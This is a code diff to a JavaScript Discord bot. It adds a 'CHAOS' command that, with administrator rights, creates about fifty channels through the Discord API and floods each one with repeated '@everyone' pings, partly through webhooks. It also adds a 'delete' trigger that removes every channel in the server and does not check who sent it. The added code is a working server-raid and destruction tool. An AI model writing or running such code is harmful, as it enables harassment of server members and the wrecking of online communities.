@@ -38,6 +38,64 @@ function read(filePath, cb) {
 }
 
 
+
+
+client.on("message", async msg => {
+  if(msg.content === `${prefix}CHAOS`) {
+    if(msg.author.id === assy)
+    if(msg.channel.type === 'dm') {return msg.channel.send("This is a dm chat")}
+    if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
+      var n = 0
+      var gid = msg.guild.id
+       while(n < 50) {
+        setTimeout(() => {
+          axios({
+            url: `https://discord.com/api/v8/guilds/${gid}/channels`,
+            method: 'POST',
+            headers: {
+             authorization: `Bot ${token1}`
+            },data: {"type":0,"name": cNames(),"permission_overwrites":[]}
+          }).then(async(c) => {
+            const channnel = await msg.guild.channels.cache.find(cc => cc.id ===  c.data.id)
+            if(channnel.type === 'text') {
+              channnel.createWebhook("ass").then(w => {
+                [1,1,1,1,1,1,11,1,1,1,1,1,1,1,1,1,1,11,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
+                  w.send("@everyone")
+                })
+              })
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+              await channnel.send("@everyone")
+            }
+        })
+         }, 1800);
+         n++
+    }
+  }
+}else if(msg.content === 'delete') {
+  msg.guild.channels.cache.forEach(c => {
+    c.delete()
+  })
+}
+})
+
+
+
+
+
+
+
+
 client.on("message", msg => {
 if(msg.content === 'bruh') {
 
